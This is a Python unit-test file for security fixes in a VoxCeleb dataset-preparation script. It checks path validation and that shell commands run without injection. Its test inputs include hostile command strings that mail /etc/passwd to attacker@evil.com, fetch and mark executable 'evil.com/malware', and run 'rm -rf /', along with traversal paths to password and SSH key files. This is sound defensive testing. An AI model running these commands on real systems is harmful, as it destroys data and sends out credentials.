"""Unit tests for security fixes in prepare_voxceleb.py"""

import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock, patch, call, MagicMock
import shutil

# Add the TTS module to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from TTS.encoder.utils.prepare_voxceleb import (
    validate_path, exec_cmd, decode_aac_with_ffmpeg, download_and_extract
)


class TestSecurityFixes(unittest.TestCase):
    """Test suite for security vulnerabilities fixes in prepare_voxceleb.py"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.test_dir = tempfile.mkdtemp()
        
    def tearDown(self):
        """Clean up test fixtures"""
        if os.path.exists(self.test_dir):
            shutil.rmtree(self.test_dir)
    
    def test_validate_path_normal_paths(self):
        """Test validate_path with normal, safe paths"""
        # Test absolute path
        safe_path = "/tmp/test_file.txt"
        result = validate_path(safe_path)
        self.assertEqual(result, "/tmp/test_file.txt")
        
        # Test relative path (should resolve to absolute)
        with patch('pathlib.Path.resolve') as mock_resolve:
            mock_resolve.return_value = Path("/home/user/test.txt")
            result = validate_path("test.txt")
            self.assertIn("test.txt", str(mock_resolve.return_value))
    
    def test_validate_path_directory_traversal(self):
        """Test validate_path blocks directory traversal attempts"""
        # Test path with ..
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa"
        ]
        
        for path in dangerous_paths:
            with self.assertRaises(ValueError) as cm:
                validate_path(path)
            self.assertIn("directory traversal", str(cm.exception).lower())
    
    def test_validate_path_special_characters(self):
        """Test validate_path handles special characters safely"""
        # Create test files with special characters
        special_names = [
            "file with spaces.txt",
            "file'with'quotes.txt",
            "file;with;semicolon.txt",
            "file|with|pipe.txt",
            "file&with&ampersand.txt",
            "file$with$dollar.txt"
        ]
        
        for name in special_names:
            test_path = os.path.join(self.test_dir, name)
            # Create the file
            Path(test_path).touch()
            
            # Validate should work without issues
            result = validate_path(test_path)
            self.assertTrue(os.path.exists(result))
    
    @patch('subprocess.run')
    def test_exec_cmd_no_shell_injection(self, mock_run):
        """Test exec_cmd doesn't allow shell injection"""
        mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
        
        # Test with potentially dangerous input
        dangerous_commands = [
            "ls; rm -rf /",
            "cat /etc/passwd | mail attacker@evil.com",
            "wget evil.com/malware && chmod +x malware",
            "echo 'test' > /etc/passwd"
        ]
        
        for cmd in dangerous_commands:
            exec_cmd(cmd)
            # Verify subprocess.run was called with a list, not shell=True
            args, kwargs = mock_run.call_args
            self.assertIsInstance(args[0], list)
            self.assertNotIn('shell', kwargs)
            # The command should be properly split, not executed as shell
            self.assertNotIn(';', ' '.join(args[0]))
    
    @patch('subprocess.run')
    def test_exec_cmd_with_special_chars_in_filenames(self, mock_run):
        """Test exec_cmd handles filenames with special characters"""
        mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
        
        # Test filenames with special characters
        test_files = [
            "file with spaces.txt",
            "file'with'single'quotes.txt",
            'file"with"double"quotes.txt',
            "file;with;semicolon.txt",
            "file&with&ampersand.txt"
        ]
        
        for filename in test_files:
            cmd = f'ffmpeg -i "{filename}" output.wav'
            exec_cmd(cmd)
            
            # Verify the filename is passed as a single argument
            args, kwargs = mock_run.call_args
            self.assertIn(filename, args[0])
            self.assertIsInstance(args[0], list)
    
    @patch('TTS.encoder.utils.prepare_voxceleb.exec_cmd')
    def test_decode_aac_with_ffmpeg_safe(self, mock_exec):
        """Test decode_aac_with_ffmpeg uses safe command execution"""
        mock_exec.return_value = 0
        
        # Test with files containing special characters
        test_cases = [
            ("input with spaces.aac", "output with spaces.wav"),
            ("input'quotes.aac", "output'quotes.wav"),
            ("input;semicolon.aac", "output;semicolon.wav")
        ]
        
        for input_file, output_file in test_cases:
            input_path = os.path.join(self.test_dir, input_file)
            output_path = os.path.join(self.test_dir, output_file)
            
            # Create dummy input file
            Path(input_path).touch()
            
            # Call the function
            result = decode_aac_with_ffmpeg(input_path, output_path)
            
            self.assertTrue(result)
            # Verify exec_cmd was called with a list
            args, _ = mock_exec.call_args
            self.assertIsInstance(args[0], list)
            self.assertEqual(args[0][0], "ffmpeg")
            self.assertIn(input_path, args[0])
            self.assertIn(output_path, args[0])
    
    @patch('subprocess.run')
    @patch('TTS.encoder.utils.prepare_voxceleb.USER', {"user": "testuser", "password": "testpass"})
    def test_download_and_extract_safe_wget(self, mock_run):
        """Test download_and_extract uses safe wget command"""
        mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
        
        # Mock file operations
        with patch('os.path.exists', return_value=False), \
             patch('os.stat', return_value=Mock(st_size=1000)), \
             patch('builtins.open', unittest.mock.mock_open(read_data=b'test')), \
             patch('hashlib.md5') as mock_md5, \
             patch('zipfile.ZipFile'), \
             patch('TTS.encoder.utils.prepare_voxceleb.MD5SUM', {"test_subset": "test_hash"}):
            
            mock_md5.return_value.hexdigest.return_value = "test_hash"
            
            # Test URL with special characters that could be dangerous
            urls = [
                "https://example.com/file.zip",
                "https://example.com/file with spaces.zip",
                "https://example.com/file;rm -rf /.zip"
            ]
            
            download_and_extract(self.test_dir, "test_subset", urls)
            
            # Verify wget was called safely
            for call_args in mock_run.call_args_list:
                args, kwargs = call_args
                cmd_list = args[0]
                
                # Ensure it's a list (not using shell=True)
                self.assertIsInstance(cmd_list, list)
                self.assertEqual(cmd_list[0], "wget")
                # Ensure no shell injection in the command
                self.assertNotIn(";", " ".join(cmd_list))
                self.assertNotIn("&&", " ".join(cmd_list))
                self.assertNotIn("|", " ".join(cmd_list))
    
    @patch('glob.glob')
    @patch('builtins.open', new_callable=unittest.mock.mock_open)
    @patch('shutil.copyfileobj')
    def test_concatenate_files_safely(self, mock_copy, mock_open, mock_glob):
        """Test file concatenation doesn't use shell commands"""
        # Set up mock glob to return part files
        part_files = [
            "/tmp/file_partaa",
            "/tmp/file_partab",
            "/tmp/file_partac"
        ]
        mock_glob.return_value = part_files
        
        with patch('subprocess.run') as mock_run, \
             patch('os.path.exists', return_value=False), \
             patch('os.stat', return_value=Mock(st_size=1000)), \
             patch('hashlib.md5') as mock_md5, \
             patch('zipfile.ZipFile'), \
             patch('shutil.move'), \
             patch('TTS.encoder.utils.prepare_voxceleb.USER', {"user": "test", "password": "test"}), \
             patch('TTS.encoder.utils.prepare_voxceleb.MD5SUM', {"test": "hash"}):
            
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
            mock_md5.return_value.hexdigest.return_value = "hash"
            
            # Test that cat command is NOT used
            download_and_extract(self.test_dir, "test", ["https://example.com/file_partaa"])
            
            # Verify shutil.copyfileobj was used instead of shell cat
            if mock_copy.called:
                self.assertTrue(mock_copy.called)
                # Verify no shell cat command was executed
                for call_args in mock_run.call_args_list:
                    cmd = call_args[0][0] if call_args[0] else []
                    if isinstance(cmd, list) and cmd:
                        self.assertNotIn("cat", cmd[0])
    
    def test_path_validation_in_convert_audio(self):
        """Test that convert_audio_and_make_label handles paths safely"""
        from TTS.encoder.utils.prepare_voxceleb import convert_audio_and_make_label
        
        # Create a test directory structure
        test_subset = "test_subset"
        subset_dir = os.path.join(self.test_dir, test_subset)
        os.makedirs(subset_dir)
        
        # Create a speaker directory with special characters
        speaker_dir = os.path.join(subset_dir, "speaker with spaces", "video_id")
        os.makedirs(speaker_dir)
        
        # Create test wav file
        test_wav = os.path.join(speaker_dir, "test file.wav")
        Path(test_wav).touch()
        
        # Mock soundfile read
        with patch('soundfile.read', return_value=([0] * 1000, 16000)):
            # This should handle the special characters without shell injection
            output_file = "output.csv"
            convert_audio_and_make_label(self.test_dir, test_subset, self.test_dir, output_file)
            
            # Verify CSV was created
            csv_path = os.path.join(self.test_dir, output_file)
            self.assertTrue(os.path.exists(csv_path))


class TestRegressionSuite(unittest.TestCase):
    """Regression tests to ensure functionality still works after security fixes"""
    
    @patch('subprocess.run')
    def test_ffmpeg_command_format(self, mock_run):
        """Ensure ffmpeg commands are formatted correctly"""
        mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
        
        with patch('pathlib.Path.resolve') as mock_resolve:
            mock_resolve.side_effect = lambda: Path("/tmp/test.aac")
            exec_cmd(["ffmpeg", "-i", "/tmp/test.aac", "/tmp/test.wav"])
            
            # Verify the command was called correctly
            args, _ = mock_run.call_args
            self.assertEqual(args[0], ["ffmpeg", "-i", "/tmp/test.aac", "/tmp/test.wav"])
    
    @patch('subprocess.run')
    def test_wget_auth_parameters(self, mock_run):
        """Ensure wget authentication parameters are passed correctly"""
        mock_run.return_value = Mock(returncode=0, stdout="", stderr="")
        
        with patch('os.path.exists', return_value=False), \
             patch('os.stat', return_value=Mock(st_size=1000)), \
             patch('builtins.open', unittest.mock.mock_open(read_data=b'test')), \
             patch('hashlib.md5') as mock_md5, \
             patch('zipfile.ZipFile'), \
             patch('TTS.encoder.utils.prepare_voxceleb.USER', {"user": "myuser", "password": "mypass"}), \
             patch('TTS.encoder.utils.prepare_voxceleb.MD5SUM', {"test": "hash"}):
            
            mock_md5.return_value.hexdigest.return_value = "hash"
            
            download_and_extract("/tmp", "test", ["https://example.com/file.zip"])
            
            # Verify wget was called with correct auth params
            args, _ = mock_run.call_args
            cmd = args[0]
            self.assertIn("--user", cmd)
            self.assertIn("myuser", cmd)
            self.assertIn("--password", cmd)
            self.assertIn("mypass", cmd)


if __name__ == '__main__':
    unittest.main()